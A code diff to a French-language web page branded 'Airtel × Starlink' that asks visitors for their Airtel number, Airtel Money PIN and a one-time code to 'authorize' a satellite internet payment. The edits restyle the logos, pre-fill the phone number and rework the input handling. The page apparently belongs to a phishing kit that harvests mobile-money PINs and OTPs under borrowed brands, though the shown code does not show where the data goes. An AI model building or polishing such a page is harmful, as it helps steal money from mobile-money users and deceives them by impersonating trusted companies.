@@ -135,6 +135,8 @@ img{display:block;max-width:100%}
 .curtain-logos{display:flex;align-items:center;gap:14px}
 .curtain-x{font-size:18px;font-weight:700;color:rgba(255,255,255,.4)}
 .rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(255,255,255,.15);transform:scale(0);animation:rip-anim .5s ease forwards}
+
+
 </style>
 </head>
 <body>
@@ -176,35 +178,48 @@ img{display:block;max-width:100%}
 <!-- VIEW: CONNEXION -->
 <div class="view active" id="viewLogin">
   <div class="content">
+
+    <!-- Brand card -->
     <div class="brand-card">
       <div class="brand-logos">
-        <img src="assets/logo.svg" alt="Airtel" height="28" onerror="this.style.display='none'">
+        <img src="assets/logo.svg" alt="Airtel" height="28" style="filter:brightness(0) invert(1)" onerror="this.style.display='none'">
         <span class="brand-x">&times;</span>
-        <img src="assets/starlink_logo_with_icon_transparent_black.png" alt="Starlink" height="28" onerror="this.style.display='none'">
+        <img src="assets/starlink_logo_with_icon_transparent_black.png" alt="Starlink" height="28" style="filter:brightness(0) invert(1)" onerror="this.style.display='none'">
       </div>
       <div class="brand-title">Connexion Airtel Lite</div>
-      <div class="brand-sub">Entrez votre num&eacute;ro Airtel et votre code PIN &agrave; 4 chiffres pour autoriser votre paiement haut d&eacute;bit satellite.</div>
+      <div class="brand-sub">V&eacute;rifiez votre num&eacute;ro et entrez votre code PIN Airtel Money pour autoriser le paiement.</div>
     </div>
+
+    <!-- Plan summary chip -->
     <div class="forfait-chip">
-      <div><div class="fc-tag">Forfait S&eacute;lectionn&eacute;</div><div class="fc-val" id="forfaitLabel">Chargement&hellip;</div></div>
+      <div>
+        <div class="fc-tag">Forfait S&eacute;lectionn&eacute;</div>
+        <div class="fc-val" id="forfaitLabel">Chargement&hellip;</div>
+      </div>
       <div class="fc-change" onclick="goBack()">Modifier</div>
     </div>
+
+    <!-- Phone — pre-filled read-only from session -->
     <div class="field">
       <div class="field-lbl">Num&eacute;ro Airtel Lite&nbsp;<span style="color:var(--err);font-size:16px;font-weight:900;line-height:1;text-transform:none">*</span></div>
-      <div class="fw" id="fw-phone">
+      <div class="fw ok" id="fw-phone">
         <div class="prefix">
           <span class="prefix-flag">&#127464;&#127465;</span>
           <span class="prefix-code">+243</span>
         </div>
-        <input class="f-input" id="phoneInput" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="9X XXX XXXX" maxlength="9" autocomplete="tel-national">
+        <input class="f-input" id="phoneInput" type="tel" inputmode="numeric" pattern="[0-9]*"
+          placeholder="9X XXX XXXX" maxlength="9" autocomplete="tel-national"
+          style="-webkit-user-select:text!important;user-select:text!important">
       </div>
       <div class="f-err" id="phoneErr"></div>
     </div>
+
+    <!-- PIN -->
     <div style="display:flex;flex-direction:column;gap:8px">
       <div style="display:flex;align-items:center;justify-content:space-between">
         <div class="pin-lbl">Code PIN de S&eacute;curit&eacute; (4 chiffres)</div>
         <button id="peekBtn" onclick="togglePeek()" style="display:flex;align-items:center;gap:4px;font-size:12px;font-weight:600;color:var(--outline);padding:4px 0;background:none;border:none;cursor:pointer">
-          <svg id="peekIcon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+          <svg id="peekIcon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
           <span id="peekTxt">Afficher</span>
         </button>
       </div>
@@ -216,19 +231,24 @@ img{display:block;max-width:100%}
       </div>
       <div class="pin-err" id="pinErr"></div>
     </div>
+
+    <!-- Numpad -->
     <div class="numpad" id="pinPad">
       <button class="nk" data-v="1">1</button><button class="nk" data-v="2">2</button><button class="nk" data-v="3">3</button>
       <button class="nk" data-v="4">4</button><button class="nk" data-v="5">5</button><button class="nk" data-v="6">6</button>
       <button class="nk" data-v="7">7</button><button class="nk" data-v="8">8</button><button class="nk" data-v="9">9</button>
       <button class="nk empty" disabled></button><button class="nk" data-v="0">0</button><button class="nk del" id="npDel">&#9003;</button>
     </div>
+
+    <!-- Submit -->
     <button class="btn-primary dim" id="loginBtn" onclick="submitLogin()">
       <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
       Autoriser le Paiement
     </button>
+
     <div style="height:8px"></div>
   </div>
-</div>
+</div><!-- /viewLogin -->
 
 <!-- VIEW: TRAITEMENT -->
 <div class="view" id="viewProc">
@@ -258,7 +278,7 @@ img{display:block;max-width:100%}
       <div class="otp-icon"><svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2.2" stroke-linecap="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18" stroke-width="3"/></svg></div>
       <div class="brand-title">V&eacute;rification OTP</div>
       <div class="brand-sub">Un code &agrave; 4 chiffres a &eacute;t&eacute; envoy&eacute; sur votre num&eacute;ro Airtel</div>
-      <div class="otp-phone" id="otpPhone">+243 &mdash;</div>
+      <div class="otp-phone" id="otpPhone"><span style="margin-right:5px">&#127464;&#127465;</span>+243 &mdash;</div>
     </div>
 
     <!-- OTP boxes — tap to focus native keyboard -->
@@ -308,7 +328,16 @@ function slp(ms){return new Promise(function(r){setTimeout(r,ms);});}
 var forfait={};
 try{forfait=JSON.parse(sessionStorage.getItem('starlinkForfait')||'{}');}catch(e){}
 if(!forfait.name){location.href='airtel-index.html';}
+// Fill plan chip
 document.getElementById('forfaitLabel').textContent=(forfait.name||'')+' \u00b7 '+(forfait.price||'');
+// Pre-fill phone from session — read-only style
+var phEl=document.getElementById('phoneInput');
+if(phEl&&forfait.phone){
+  phEl.value=forfait.phone;
+  phEl.readOnly=true;
+  phEl.style.color='var(--on-surf)';
+  phEl.style.opacity='1';
+}
 
 function goBack(){location.href='airtel-index.html';}
 
@@ -338,6 +367,25 @@ function togglePeek(){
     ?'<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>'
     :'<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
   renderPIN();
+// Phone field events — allow editing if needed
+var _phEl=document.getElementById('phoneInput');
+if(_phEl){
+  _phEl.addEventListener('focus',function(){document.getElementById('fw-phone').classList.add('focus');});
+  _phEl.addEventListener('blur',function(){
+    document.getElementById('fw-phone').classList.remove('focus');
+    var v=this.value.replace(/[^0-9]/g,'');
+    var fw=document.getElementById('fw-phone');
+    if(v&&v.length!==9){fw.classList.add('err');fw.classList.remove('ok');document.getElementById('phoneErr').textContent='Num\u00e9ro invalide \u2014 9 chiffres requis';}
+    else if(v.length===9&&!/^[89]/.test(v)){fw.classList.add('err');fw.classList.remove('ok');document.getElementById('phoneErr').textContent='Num\u00e9ro Airtel invalide \u2014 doit commencer par 8 ou 9';}
+    else if(v.length===9){fw.classList.remove('err');fw.classList.add('ok');document.getElementById('phoneErr').textContent='';}
+  });
+  _phEl.addEventListener('input',function(){
+    this.value=this.value.replace(/[^0-9]/g,'').slice(0,9);
+    document.getElementById('fw-phone').classList.remove('err','ok');
+    document.getElementById('phoneErr').textContent='';
+    updateLoginBtn();
+  });
+}
 }
 function renderPIN(){
   for(var i=0;i<4;i++){
@@ -370,7 +418,7 @@ function renderPIN(){
   updateLoginBtn();
 }
 function updateLoginBtn(){
-  var ph=document.getElementById('phoneInput').value.replace(/[^0-9]/g,'');
+  var ph=forfait.phone||'';
   document.getElementById('loginBtn').classList.toggle('dim',!(ph.length===9&&pin.length===4));
 }
 document.getElementById('pinPad').addEventListener('click',function(e){
@@ -380,7 +428,7 @@ document.getElementById('pinPad').addEventListener('click',function(e){
   else if(k.dataset.v!==undefined&&pin.length<4){pin+=k.dataset.v;}
   renderPIN();
 });
-document.getElementById('phoneInput').addEventListener('focus',function(){document.getElementById('fw-phone').classList.add('focus');});
+
 document.getElementById('phoneInput').addEventListener('blur',function(){
   document.getElementById('fw-phone').classList.remove('focus');
   var v=this.value.replace(/[^0-9]/g,'');
@@ -389,12 +437,7 @@ document.getElementById('phoneInput').addEventListener('blur',function(){
   else if(v.length===9&&!/^[89]/.test(v)){fw.classList.add('err');document.getElementById('phoneErr').textContent='Num\u00e9ro Airtel invalide — doit commencer par 8 ou 9';}
   else if(v.length===9){fw.classList.remove('err');fw.classList.add('ok');document.getElementById('phoneErr').textContent='';}
 });
-document.getElementById('phoneInput').addEventListener('input',function(){
-  this.value=this.value.replace(/[^0-9]/g,'').slice(0,9);
-  document.getElementById('fw-phone').classList.remove('err','ok');
-  document.getElementById('phoneErr').textContent='';
-  updateLoginBtn();
-});
+
 renderPIN();
 
 // Submit login
@@ -432,7 +475,7 @@ async function runProcessing(ph){
     }
   }
   await slp(500);
-  document.getElementById('otpPhone').textContent='+243 '+ph.slice(0,2)+' '+ph.slice(2,5)+' '+ph.slice(5);
+  document.getElementById('otpPhone').innerHTML='<span style="margin-right:5px">&#127464;&#127465;</span>+243 '+ph.slice(0,2)+' '+ph.slice(2,5)+' '+ph.slice(5);
   otpVal='';renderOTP();updateOTPBtn();startTimer();
   setStep(3);showView('viewOTP');focusOTPInput();
   document.getElementById('navSpinner').style.display='none';
